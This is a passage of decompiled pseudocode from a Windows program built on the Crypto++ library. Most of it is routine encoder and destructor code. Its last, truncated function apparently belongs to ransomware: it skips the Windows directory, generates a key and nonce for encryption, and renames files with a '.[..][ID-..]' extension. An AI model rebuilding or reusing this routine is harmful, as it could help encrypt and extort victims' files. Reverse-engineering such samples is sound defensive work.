  a1[10] = 0;
  a1[12] = -1;
  a1[13] = 0;
  a1[14] = 0;
  sub_4535B0(a1, v6);
  LOBYTE(v26) = 4;
  v21 = sub_4550C0(&v16);
  LOBYTE(v26) = 5;
  v22 = 0;
  v7 = operator new(0x14u);
  v19 = v7;
  *(_OWORD *)v7 = 0i64;
  v7[4] = 0;
  *v7 = &CryptoPP::AlgorithmParametersBase::`vftable';
  v7[1] = "DecodingLookupArray";
  *((_WORD *)v7 + 4) = 1;
  v7[3] = 0;
  *v7 = &CryptoPP::AlgorithmParametersTemplate<int const *>::`vftable';
  v7[4] = a3;
  v22 = v7;
  LOBYTE(v26) = 9;
  v8 = (int)v21;
  v19 = (_DWORD *)v21[1];
  v21[1] = 0;
  v9 = (void (__thiscall ***)(_DWORD, int))v7[3];
  if ( v9 )
  {
    (**v9)(v9, 1);
    v8 = (int)v21;
  }
  v7[3] = v19;
  v10 = *(void (__thiscall ****)(_DWORD, int))(v8 + 4);
  v22 = 0;
  if ( v10 )
  {
    (**v10)(v10, 1);
    v8 = (int)v21;
  }
  *(_DWORD *)(v8 + 4) = v7;
  *(_BYTE *)(v8 + 8) = 1;
  LOBYTE(v26) = 5;
  v11 = sub_455040(&v14, v8);
  v20 = 1;
  LOBYTE(v26) = 10;
  if ( v17 )
    (**v17)(v17, 1);
  LOBYTE(v26) = 4;
  v16 = &CryptoPP::NameValuePairs::`vftable';
  v12 = (void *)sub_4223A0((int)v11, (int)"Log2Base", &a4);
  sub_45B640(a1, v12);
  v20 = 0;
  LOBYTE(v26) = 12;
  if ( v15 )
    (**v15)(v15, 1);
  return a1;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 4B9390: using guessed type void *CryptoPP::AlgorithmParametersBase::`vftable';
// 4BA178: using guessed type void *CryptoPP::AlgorithmParametersTemplate<int const *>::`vftable';
// 4BAAEC: using guessed type void *CryptoPP::BaseN_Decoder::`vftable';
// 4BABB4: using guessed type void *CryptoPP::BaseN_Decoder::`vftable';

//----- (004082A0) --------------------------------------------------------
_DWORD *__thiscall sub_4082A0(_DWORD *this, char a2)
{
  void (__thiscall ***v3)(_DWORD, int); // ecx
  void *v5; // [esp-4h] [ebp-20h]

  v5 = (void *)this[14];
  memset(v5, 0, *(_DWORD *)((char *)this + (this[12] < this[13] ? 0xFFFFFFFC : 0) + 52));
  j_j___free_base(v5);
  v3 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v3 )
    (**v3)(v3, 1);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00408330) --------------------------------------------------------
void __thiscall sub_408330(_DWORD *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx
  void *v3; // [esp-4h] [ebp-20h]

  v3 = (void *)this[14];
  memset(v3, 0, *(_DWORD *)((char *)this + (this[12] < this[13] ? 4 : 8) + 44));
  j_j___free_base(v3);
  v2 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v2 )
    (**v2)(v2, 1);
}

//----- (004083B0) --------------------------------------------------------
_DWORD *__thiscall sub_4083B0(_DWORD *this, char a2)
{
  void (__thiscall ***v3)(_DWORD, int); // ecx
  void *v5; // [esp-8h] [ebp-24h]
  void *v6; // [esp-4h] [ebp-20h]

  v6 = (void *)this[13];
  memset(v6, 0, *(_DWORD *)((char *)this + (this[11] < this[12] ? 0xFFFFFFFC : 0) + 48));
  j_j___free_base(v6);
  v5 = (void *)this[9];
  memset(v5, 0, *(_DWORD *)((char *)this + (this[7] < this[8] ? 0xFFFFFFFC : 0) + 32));
  j_j___free_base(v5);
  v3 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v3 )
    (**v3)(v3, 1);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00408460) --------------------------------------------------------
void __thiscall sub_408460(_DWORD *this)
{
  if ( (int)this[14] > 1 )
    this[14] = 1;
}

//----- (00408480) --------------------------------------------------------
void __thiscall sub_408480(int this)
{
  unsigned int v1; // edx
  void *v2; // esi

  v1 = *(_DWORD *)(this + 20);
  v2 = *(void **)(this + 24);
  if ( *(_DWORD *)(this + 16) < v1 )
    v1 = *(_DWORD *)(this + 16);
  memset(*(void **)(this + 24), 0, v1);
  if ( v1 )
    j_j_unknown_libname_61(v2);
  else
    j_j___free_base(v2);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (00408500) --------------------------------------------------------
int __thiscall sub_408500(_DWORD *this, int a2)
{
  int v3; // eax
  int v4; // eax
  void *v5; // ecx
  void *v6; // ecx
  int result; // eax
  int v8[5]; // [esp+Ch] [ebp-44h] BYREF
  unsigned int v9; // [esp+20h] [ebp-30h]
  int v10; // [esp+24h] [ebp-2Ch]
  void *v11[4]; // [esp+28h] [ebp-28h] BYREF
  int v12; // [esp+38h] [ebp-18h]
  unsigned int v13; // [esp+3Ch] [ebp-14h]
  int v14; // [esp+40h] [ebp-10h]
  int v15; // [esp+4Ch] [ebp-4h]

  v10 = a2;
  v14 = 0;
  v12 = 0;
  v13 = 15;
  LOBYTE(v11[0]) = 0;
  sub_41EF80(v11, "/GCM", 4u);
  v15 = 1;
  v3 = (*(int (__thiscall **)(_DWORD *))(*(this - 1) + 124))(this - 1);
  v4 = (*(int (__thiscall **)(int, int *))(*(_DWORD *)(v3 + 4) + 8))(v3 + 4, v8);
  LOBYTE(v15) = 2;
  sub_4220E0(a2, v4, (char *)v11);
  v14 = 1;
  LOBYTE(v15) = 1;
  if ( v9 >= 0x10 )
  {
    v5 = (void *)v8[0];
    if ( v9 + 1 >= 0x1000 )
    {
      v5 = *(void **)(v8[0] - 4);
      if ( (unsigned int)(v8[0] - (_DWORD)v5 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v5);
  }
  v8[4] = 0;
  v9 = 15;
  LOBYTE(v8[0]) = 0;
  LOBYTE(v15) = 0;
  if ( v13 >= 0x10 )
  {
    v6 = v11[0];
    if ( v13 + 1 >= 0x1000 )
    {
      v6 = (void *)*((_DWORD *)v11[0] - 1);
      if ( (unsigned int)(v11[0] - v6 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v6);
  }
  v12 = 0;
  result = a2;
  v13 = 15;
  LOBYTE(v11[0]) = 0;
  return result;
}

//----- (00408650) --------------------------------------------------------
int __thiscall sub_408650(_DWORD *this, int a2)
{
  int v2; // eax

  v2 = (*(int (__thiscall **)(_DWORD *))(*(this - 1) + 124))(this - 1);
  (*(void (__cdecl **)(int))(*(_DWORD *)(v2 + 4) + 12))(a2);
  return a2;
}

//----- (004086B0) --------------------------------------------------------
int __thiscall sub_4086B0(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 124))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 4))(v1);
}

//----- (004086C0) --------------------------------------------------------
int __thiscall sub_4086C0(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 124))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 8))(v1);
}

//----- (004086D0) --------------------------------------------------------
int __thiscall sub_4086D0(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 124))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 12))(v1);
}

//----- (004086E0) --------------------------------------------------------
int __thiscall sub_4086E0(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 124))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 16))(v1);
}

//----- (00408700) --------------------------------------------------------
int __thiscall sub_408700(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 124))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 20))(v1);
}

//----- (00408720) --------------------------------------------------------
int sub_408720()
{
  return 12;
}

//----- (00408730) --------------------------------------------------------
int sub_408730()
{
  return -1;
}

//----- (00408740) --------------------------------------------------------
int sub_408740()
{
  return 16;
}

//----- (00408750) --------------------------------------------------------
__int64 sub_408750()
{
  return 0x1FFFFFFFFFFFFFFFi64;
}

//----- (00408760) --------------------------------------------------------
__int64 sub_408760()
{
  return 0xFFFFFFFE0i64;
}

//----- (00408770) --------------------------------------------------------
char *__thiscall sub_408770(char *this)
{
  return this + 64;
}

//----- (00408780) --------------------------------------------------------
_DWORD *__thiscall sub_408780(void *this, _DWORD *a2)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  unsigned int v4; // edx
  void *v5; // ebx
  char v7[4]; // [esp+10h] [ebp-28h] BYREF
  unsigned int v8; // [esp+18h] [ebp-20h]
  unsigned int v9; // [esp+1Ch] [ebp-1Ch]
  void *Block; // [esp+20h] [ebp-18h]
  int v11; // [esp+28h] [ebp-10h]
  int v12; // [esp+34h] [ebp-4h]

  v11 = 0;
  v2 = (_DWORD *)(*(int (__thiscall **)(void *, char *))(*(_DWORD *)this + 4))(this, v7);
  v12 = 1;
  v3 = sub_43DEB0(v2);
  sub_43D420(a2, v3);
  v11 = 1;
  v12 = 0;
  v4 = v9;
  v5 = Block;
  if ( v8 < v9 )
    v4 = v8;
  memset(Block, 0, 4 * v4);
  if ( v4 )
    j_j_unknown_libname_61(v5);
  else
    j_j___free_base(v5);
  return a2;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 408780: using guessed type char var_28[4];

//----- (00408820) --------------------------------------------------------
_DWORD *__thiscall sub_408820(void *this, _DWORD *a2)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  unsigned int v4; // edx
  void *v5; // ebx
  char v7[8]; // [esp+10h] [ebp-28h] BYREF
  unsigned int v8; // [esp+18h] [ebp-20h]
  unsigned int v9; // [esp+1Ch] [ebp-1Ch]
  void *Block; // [esp+20h] [ebp-18h]
  int v11; // [esp+28h] [ebp-10h]
  int v12; // [esp+34h] [ebp-4h]

  v11 = 0;
  v2 = (_DWORD *)(*(int (__thiscall **)(void *, char *))(*(_DWORD *)this + 8))(this, v7);
  v12 = 1;
  v3 = sub_43DEB0(v2);
  sub_43D420(a2, v3);
  v11 = 1;
  v12 = 0;
  v4 = v9;
  v5 = Block;
  if ( v8 < v9 )
    v4 = v8;
  memset(Block, 0, 4 * v4);
  if ( v4 )
    j_j_unknown_libname_61(v5);
  else
    j_j___free_base(v5);
  return a2;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 408820: using guessed type char var_28[8];

//----- (004088C0) --------------------------------------------------------
int __thiscall sub_4088C0(void *this, int a2, int a3, int a4)
{
  (*(void (__cdecl **)(int))(*(_DWORD *)this + 28))(a2);
  return a2;
}

//----- (00408920) --------------------------------------------------------
int __thiscall sub_408920(void *this, int a2, int a3, int a4)
{
  (*(void (__cdecl **)(int))(*(_DWORD *)this + 12))(a2);
  return a2;
}

//----- (00408980) --------------------------------------------------------
void __stdcall sub_408980(int a1, int a2, int a3, int a4, int a5, char a6)
{
  sub_435450(a1, a2, a3, a4, a5, 0, 0, a6, 0);
}

//----- (004089B0) --------------------------------------------------------
bool __stdcall sub_4089B0(const char *a1)
{
  return strcmp(a1, "EncodingParameters") == 0;
}

//----- (00408A00) --------------------------------------------------------
void __thiscall sub_408A00(_DWORD *this)
{
  _DWORD *v2; // eax

  *this = &CryptoPP::OID::`vftable';
  v2 = (_DWORD *)this[1];
  if ( v2 )
  {
    if ( ((this[3] - (_DWORD)v2) & 0xFFFFFFFC) >= 0x1000 )
    {
      if ( (unsigned int)v2 - *(v2 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v2 = (_DWORD *)*(v2 - 1);
    }
    sub_46C87D(v2);
    this[1] = 0;
    this[2] = 0;
    this[3] = 0;
  }
}
// 4B8A28: using guessed type void *CryptoPP::OID::`vftable';

//----- (00408AA0) --------------------------------------------------------
_DWORD *__thiscall sub_408AA0(_DWORD *this, char a2)
{
  sub_408A00(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00408AF0) --------------------------------------------------------
char __stdcall sub_408AF0(int a1)
{
  sub_4337C0(a1);
  return 0;
}

//----- (00408B10) --------------------------------------------------------
char __stdcall sub_408B10(int *a1)
{
  sub_433EF0(a1);
  return 0;
}

//----- (00408B30) --------------------------------------------------------
_DWORD *__thiscall sub_408B30(_DWORD *this, char a2)
{
  int v3; // eax

  v3 = this[1];
  *this = &CryptoPP::X509PublicKey::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(v3 + 4) + 4) = &CryptoPP::X509PublicKey::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4BA8E0: using guessed type void *CryptoPP::X509PublicKey::`vftable';
// 4BA908: using guessed type void *CryptoPP::X509PublicKey::`vftable';

//----- (00408B70) --------------------------------------------------------
void __thiscall sub_408B70(_DWORD *this)
{
  int v1; // eax

  v1 = this[2];
  *this = &CryptoPP::PKCS8PrivateKey::`vftable';
  this[1] = &CryptoPP::PKCS8PrivateKey::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(v1 + 4) + 8) = &CryptoPP::PKCS8PrivateKey::`vftable';
  boost::exception::~exception((boost::exception *)(this + 3));
}
// 45F280: using guessed type void __thiscall boost::exception::~exception(boost::exception *__hidden this);
// 4BA938: using guessed type void *CryptoPP::PKCS8PrivateKey::`vftable';
// 4BA968: using guessed type void *CryptoPP::PKCS8PrivateKey::`vftable';
// 4BA970: using guessed type void *CryptoPP::PKCS8PrivateKey::`vftable';

//----- (00408BD0) --------------------------------------------------------
_DWORD *__thiscall sub_408BD0(_DWORD *this, char a2)
{
  int v3; // eax

  v3 = this[2];
  *this = &CryptoPP::PKCS8PrivateKey::`vftable';
  this[1] = &CryptoPP::PKCS8PrivateKey::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(v3 + 4) + 8) = &CryptoPP::PKCS8PrivateKey::`vftable';
  boost::exception::~exception((boost::exception *)(this + 3));
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 45F280: using guessed type void __thiscall boost::exception::~exception(boost::exception *__hidden this);
// 4BA938: using guessed type void *CryptoPP::PKCS8PrivateKey::`vftable';
// 4BA968: using guessed type void *CryptoPP::PKCS8PrivateKey::`vftable';
// 4BA970: using guessed type void *CryptoPP::PKCS8PrivateKey::`vftable';

//----- (00408C50) --------------------------------------------------------
_DWORD *__thiscall sub_408C50(_DWORD *this, _DWORD *a2)
{
  sub_43D420(a2, this + 3);
  return a2;
}

//----- (00408CB0) --------------------------------------------------------
void __thiscall sub_408CB0(int *this, int *a2)
{
  sub_432F90(this + 15, a2);
}

//----- (00408CC0) --------------------------------------------------------
void __thiscall sub_408CC0(int *this, int a2)
{
  sub_433BB0(this + 15, a2);
}

//----- (00408CD0) --------------------------------------------------------
void __thiscall sub_408CD0(int *this, int *a2)
{
  sub_432F90(this - 49, a2);
}

//----- (00408CE0) --------------------------------------------------------
void __thiscall sub_408CE0(int *this, int a2)
{
  sub_433BB0(this - 49, a2);
}

//----- (00408CF0) --------------------------------------------------------
_DWORD *__stdcall sub_408CF0(_DWORD *a1)
{
  sub_450960(a1);
  return a1;
}

//----- (00408D50) --------------------------------------------------------
_DWORD *__thiscall sub_408D50(_DWORD *this, int a2, int a3, int a4)
{
  _DWORD *v4; // edi
  _DWORD *v5; // esi
  _DWORD *v6; // ebx
  _DWORD *v7; // eax
  int v8; // eax
  _DWORD *v9; // esi
  int v10; // eax
  int v12; // [esp+14h] [ebp-40h] BYREF
  void (__thiscall ***v13)(_DWORD, int); // [esp+18h] [ebp-3Ch]
  void **v14; // [esp+20h] [ebp-34h] BYREF
  void (__thiscall ***v15)(_DWORD, int); // [esp+24h] [ebp-30h]
  _DWORD *v16; // [esp+2Ch] [ebp-28h]
  _DWORD *v17; // [esp+30h] [ebp-24h]
  _DWORD *v18; // [esp+34h] [ebp-20h]
  _DWORD *v19; // [esp+38h] [ebp-1Ch]
  int v20; // [esp+3Ch] [ebp-18h]
  int v21; // [esp+40h] [ebp-14h] BYREF
  char v22[4]; // [esp+44h] [ebp-10h] BYREF
  int v23; // [esp+50h] [ebp-4h]

  v19 = this;
  v18 = this;
  v20 = 0;
  v21 = 72;
  v22[0] = 1;
  v4 = operator new(0x40u);
  v17 = v4;
  memset(v4, 0, 0x40u);
  v5 = operator new(0x40u);
  v16 = v5;
  memset(v5, 0, 0x40u);
  sub_452860(v5, 0);
  *v5 = &CryptoPP::Grouper::`vftable';
  v5[1] = &CryptoPP::Grouper::`vftable';
  v5[7] = -1;
  v5[8] = 0;
  v5[9] = 0;
  v5[11] = -1;
  v5[12] = 0;
  v5[13] = 0;
  v5[14] = 0;
  v5[15] = 0;
  sub_4535B0(v5, 0);
  sub_452860(v4, 0);
  *v4 = &CryptoPP::BaseN_Encoder::`vftable';
  v4[1] = &CryptoPP::BaseN_Encoder::`vftable';
  v4[6] = 0;
  v4[7] = 0;
  v4[8] = 0;
  v4[9] = 0;
  v4[10] = 0;
  v4[11] = 0;
  v4[13] = -1;
  v4[14] = 0;
  v4[15] = 0;
  sub_4535B0(v4, (int)v5);
  v6 = v19;
  sub_452D00(v19, (int)v4, 0, 0, a2);
  *v19 = &CryptoPP::SimpleProxyFilter::`vftable';
  v6[1] = &CryptoPP::SimpleProxyFilter::`vftable';
  v23 = 13;
  *v6 = &CryptoPP::Base64Encoder::`vftable';
  v6[1] = &CryptoPP::Base64Encoder::`vftable';
  LOBYTE(v23) = 14;
  v7 = sub_4550C0(&v14);
  LOBYTE(v23) = 15;
  v8 = sub_426840((int)v7, (int)"InsertLineBreaks", v22, 1);
  v9 = sub_455040(&v12, v8);
  v20 = 1;
  LOBYTE(v23) = 16;
  if ( v15 )
    (**v15)(v15, 1);
  LOBYTE(v23) = 14;
  v14 = &CryptoPP::NameValuePairs::`vftable';
  v10 = sub_4223A0((int)v9, (int)"MaxLineLength", &v21);
  sub_439360(v6, v10);
  v20 = 0;
  LOBYTE(v23) = 18;
  if ( v13 )
    (**v13)(v13, 1);
  return v6;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 4CF1EC: using guessed type void *CryptoPP::Grouper::`vftable';
// 4CF2B8: using guessed type void *CryptoPP::Base64Encoder::`vftable';
// 4CF2E0: using guessed type void *CryptoPP::SimpleProxyFilter::`vftable';
// 4CF964: using guessed type void *CryptoPP::BaseN_Encoder::`vftable';
// 4CF9B4: using guessed type void *CryptoPP::BaseN_Encoder::`vftable';
// 4CFA7C: using guessed type void *CryptoPP::SimpleProxyFilter::`vftable';
// 4CFA8C: using guessed type void *CryptoPP::Grouper::`vftable';
// 4CFC18: using guessed type void *CryptoPP::Base64Encoder::`vftable';
// 408D50: using guessed type char var_10[4];

//----- (00408FA0) --------------------------------------------------------
void __thiscall sub_408FA0(_DWORD *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx

  *this = &CryptoPP::ProxyFilter::`vftable';
  this[1] = &CryptoPP::ProxyFilter::`vftable';
  v2 = (void (__thiscall ***)(_DWORD, int))this[18];
  if ( v2 )
    (**v2)(v2, 1);
  sub_406C70(this);
}
// 4BB914: using guessed type void *CryptoPP::ProxyFilter::`vftable';
// 4BBA0C: using guessed type void *CryptoPP::ProxyFilter::`vftable';

//----- (00409010) --------------------------------------------------------
_DWORD *__thiscall sub_409010(_DWORD *this, int a2)
{
  void *v3; // eax
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v3 = sub_439290();
  sub_4080A0(this, (int)&savedregs, (int)v3, 6, 0);
  *this = &CryptoPP::Base64Decoder::`vftable';
  this[1] = &CryptoPP::Base64Decoder::`vftable';
  return this;
}
// 4CF2C8: using guessed type void *CryptoPP::Base64Decoder::`vftable';
// 4CF5A4: using guessed type void *CryptoPP::Base64Decoder::`vftable';

//----- (00409080) --------------------------------------------------------
_DWORD *__thiscall sub_409080(_DWORD *this, char a2)
{
  void (__thiscall ***v3)(_DWORD, int); // ecx
  void *v5; // [esp-4h] [ebp-20h]

  v5 = (void *)this[14];
  memset(v5, 0, *(_DWORD *)((char *)this + (this[12] < this[13] ? 0xFFFFFFFC : 0) + 52));
  j_j___free_base(v5);
  v3 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v3 )
    (**v3)(v3, 1);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00409110) --------------------------------------------------------
int __usercall sub_409110@<eax>(
        int a1@<ecx>,
        int a2@<ebp>,
        int a3@<edi>,
        int a4@<esi>,
        wchar_t *a5,
        int a6,
        int a7,
        int a8,
        int a9,
        unsigned int a10,
        _BYTE *a11,
        int a12,
        int a13,
        int a14,
        int a15,
        unsigned int a16,
        _BYTE *a17,
        int a18,
        int a19,
        int a20,
        int a21,
        unsigned int a22,
        _BYTE *a23,
        int a24,
        int a25,
        int a26,
        int a27,
        unsigned int a28,
        _BYTE *a29,
        int a30,
        int a31,
        int a32,
        int a33,
        unsigned int a34)
{
  int v35; // ecx
  int v36; // eax
  int v37; // eax
  int v38; // eax
  int v39; // eax
  int v40; // eax
  void *v41; // edx
  void *v42; // edx
  void *v43; // edx
  void *v44; // edx
  void *v45; // edx
  wchar_t *v46; // eax
  int v47; // ecx
  _DWORD *v48; // eax
  _DWORD *v49; // esi
  _DWORD *v50; // eax
  _DWORD *v51; // ecx
  _DWORD *v52; // eax
  _DWORD *v53; // eax
  int *v54; // ecx
  wchar_t *v55; // eax
  int v56; // ecx
  int i; // edx
  _DWORD *v58; // eax
  _DWORD *v59; // esi
  _DWORD *v60; // eax
  int v61; // ecx
  _DWORD *v62; // esi
  _DWORD *v63; // eax
  _DWORD *v64; // eax
  _DWORD *v65; // eax
  int v66; // ecx
  wchar_t *v67; // eax
  _DWORD *v68; // eax
  void *v69; // edx
  void *v70; // edx
  void *v71; // edx
  wchar_t *v72; // ecx
  _BYTE *v73; // ecx
  _BYTE *v74; // ecx
  _BYTE *v75; // ecx
  _BYTE *v76; // ecx
  int result; // eax
  int v78; // [esp-10h] [ebp-790h]
  int v79; // [esp-10h] [ebp-790h]
  int v80; // [esp-Ch] [ebp-78Ch]
  int v81; // [esp-Ch] [ebp-78Ch]
  int v82; // [esp-Ch] [ebp-78Ch]
  int v83; // [esp-Ch] [ebp-78Ch]
  int v84; // [esp-Ch] [ebp-78Ch]
  int v85; // [esp-Ch] [ebp-78Ch]
  int v86; // [esp-8h] [ebp-788h]
  int v87; // [esp-8h] [ebp-788h]
  int v88; // [esp-8h] [ebp-788h]
  int v89; // [esp-8h] [ebp-788h]
  int v90; // [esp-8h] [ebp-788h]
  int v91; // [esp-8h] [ebp-788h]
  int v92; // [esp-8h] [ebp-788h]
  int v93; // [esp-8h] [ebp-788h]
  _DWORD v94[3]; // [esp-4h] [ebp-784h] BYREF
  _DWORD v95[5]; // [esp+8h] [ebp-778h] BYREF
  unsigned int v96; // [esp+1Ch] [ebp-764h]
  _DWORD v97[5]; // [esp+28h] [ebp-758h] BYREF
  unsigned int v98; // [esp+3Ch] [ebp-744h]
  _DWORD v99[5]; // [esp+40h] [ebp-740h] BYREF
  unsigned int v100; // [esp+54h] [ebp-72Ch]
  _DWORD v101[5]; // [esp+58h] [ebp-728h] BYREF
  unsigned int v102; // [esp+6Ch] [ebp-714h]
  _DWORD v103[5]; // [esp+70h] [ebp-710h] BYREF
  unsigned int v104; // [esp+84h] [ebp-6FCh]
  int v105; // [esp+88h] [ebp-6F8h]
  _DWORD *v106; // [esp+8Ch] [ebp-6F4h]
  _DWORD *v107; // [esp+90h] [ebp-6F0h]
  FILE *v108[44]; // [esp+94h] [ebp-6ECh] BYREF
  _DWORD v109[44]; // [esp+144h] [ebp-63Ch] BYREF
  int v110[48]; // [esp+1F4h] [ebp-58Ch] BYREF
  _DWORD v111[44]; // [esp+2B4h] [ebp-4CCh] BYREF
  _DWORD v112[48]; // [esp+364h] [ebp-41Ch] BYREF
  _DWORD v113[22]; // [esp+424h] [ebp-35Ch] BYREF
  _DWORD v114[32]; // [esp+47Ch] [ebp-304h] BYREF
  int v115[32]; // [esp+4FCh] [ebp-284h] BYREF
  _DWORD v116[20]; // [esp+57Ch] [ebp-204h] BYREF
  _DWORD v117[14]; // [esp+5CCh] [ebp-1B4h] BYREF
  int v118[16]; // [esp+604h] [ebp-17Ch] BYREF
  _DWORD v119[14]; // [esp+644h] [ebp-13Ch] BYREF
  __int128 v120; // [esp+67Ch] [ebp-104h] BYREF
  int v121; // [esp+68Ch] [ebp-F4h]
  _DWORD v122[5]; // [esp+690h] [ebp-F0h] BYREF
  unsigned int v123; // [esp+6A4h] [ebp-DCh]
  unsigned int v124; // [esp+6A8h] [ebp-D8h]
  unsigned int v125; // [esp+6ACh] [ebp-D4h]
  unsigned int v126; // [esp+6B0h] [ebp-D0h]
  unsigned int v127; // [esp+6B4h] [ebp-CCh]
  unsigned int v128; // [esp+6B8h] [ebp-C8h]
  unsigned int v129; // [esp+6BCh] [ebp-C4h]
  unsigned int v130; // [esp+6C0h] [ebp-C0h]
  unsigned int v131; // [esp+6C4h] [ebp-BCh]
  _DWORD v132[4]; // [esp+6C8h] [ebp-B8h] BYREF
  unsigned int v133; // [esp+6D8h] [ebp-A8h]
  unsigned int v134; // [esp+6DCh] [ebp-A4h]
  _DWORD v135[5]; // [esp+6E0h] [ebp-A0h] BYREF
  unsigned int v136; // [esp+6F4h] [ebp-8Ch]
  _OWORD v137[2]; // [esp+6F8h] [ebp-88h] BYREF
  char v138[49]; // [esp+718h] [ebp-68h] BYREF
  __int64 v139; // [esp+74Ch] [ebp-34h] BYREF
  int v140; // [esp+754h] [ebp-2Ch]
  int *v141; // [esp+760h] [ebp-20h]
  _DWORD *v142; // [esp+764h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp+768h] [ebp-18h]
  void *v144; // [esp+76Ch] [ebp-14h]
  int v145; // [esp+770h] [ebp-10h]
  _DWORD v146[2]; // [esp+774h] [ebp-Ch] BYREF
  int v147; // [esp+77Ch] [ebp-4h] BYREF
  void *retaddr; // [esp+780h] [ebp+0h]

  v146[0] = a2;
  v146[1] = retaddr;
  v145 = -1;
  v144 = &loc_4AD0E1;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v141 = &v147;
  v94[2] = a4;
  v94[1] = a3;
  v142 = v94;
  v145 = 5;
  if ( sub_4191C0((char *)&a5, L"C:\\Windows", a1) == -1 && sub_4191C0((char *)&a5, L"C:\\\\Windows\\", v35) == -1 )
  {
    memset(v115, 0, sizeof(v115));
    sub_407610(v115, v80, v86);
    LOBYTE(v145) = 6;
    sub_436F80(v115, (int)v137, 32);
    sub_436F80(v115, (int)&v139, 12);
    memset(v110, 0, sizeof(v110));
    sub_409E80(v110);
    LOBYTE(v145) = 7;
    sub_437EB0(v110, (int)v137, 32, (int)&v139, 12);
    v36 = sub_4229A0((int)v97, &a5, L".[");
    LOBYTE(v145) = 8;
    v37 = sub_421DC0((int)v99, v36, (unsigned int *)&a17);
    LOBYTE(v145) = 9;
    v38 = sub_4228F0((int)v101, v37, L"][ID-");
    LOBYTE(v145) = 10;
    v39 = sub_421DC0((int)v103, v38, (unsigned int *)&a23);
    LOBYTE(v145) = 11;
    v40 = sub_4228F0((int)v95, v39, L"]");
    LOBYTE(v145) = 12;
    sub_421DC0((int)v135, v40, (unsigned int *)&a29);
    LOBYTE(v145) = 14;
    if ( v96 >= 8 )
    {
      v131 = 2 * v96 + 2;
      v41 = (void *)v95[0];
      if ( v131 >= 0x1000 )
      {
        v131 = 2 * v96 + 37;
        v41 = *(void **)(v95[0] - 4);
        if ( (unsigned int)(v95[0] - (_DWORD)v41 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_46C87D(v41);
    }
    v95[4] = 0;
    v96 = 7;
    LOWORD(v95[0]) = 0;
    LOBYTE(v145) = 15;
    if ( v104 >= 8 )
    {
      v130 = 2 * v104 + 2;
      v42 = (void *)v103[0];
      if ( v130 >= 0x1000 )
      {
        v130 = 2 * v104 + 37;
        v42 = *(void **)(v103[0] - 4);
        if ( (unsigned int)(v103[0] - (_DWORD)v42 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_46C87D(v42);
    }
    v103[4] = 0;
    v104 = 7;
    LOWORD(v103[0]) = 0;
    LOBYTE(v145) = 16;
    if ( v102 >= 8 )
    {
      v129 = 2 * v102 + 2;
      v43 = (void *)v101[0];
      if ( v129 >= 0x1000 )
      {
        v129 = 2 * v102 + 37;
        v43 = *(void **)(v101[0] - 4);
        if ( (unsigned int)(v101[0] - (_DWORD)v43 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_46C87D(v43);
    }
    v101[4] = 0;
    v102 = 7;
    LOWORD(v101[0]) = 0;
    LOBYTE(v145) = 17;
    if ( v100 >= 8 )
    {
      v128 = 2 * v100 + 2;
      v44 = (void *)v99[0];
      if ( v128 >= 0x1000 )
      {
        v128 = 2 * v100 + 37;
        v44 = *(void **)(v99[0] - 4);
        if ( (unsigned int)(v99[0] - (_DWORD)v44 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_46C87D(v44);
    }
    v99[4] = 0;
    v100 = 7;
    LOWORD(v99[0]) = 0;
    LOBYTE(v145) = 18;
    if ( v98 >= 8 )
    {
      v127 = 2 * v98 + 2;
      v45 = (void *)v97[0];
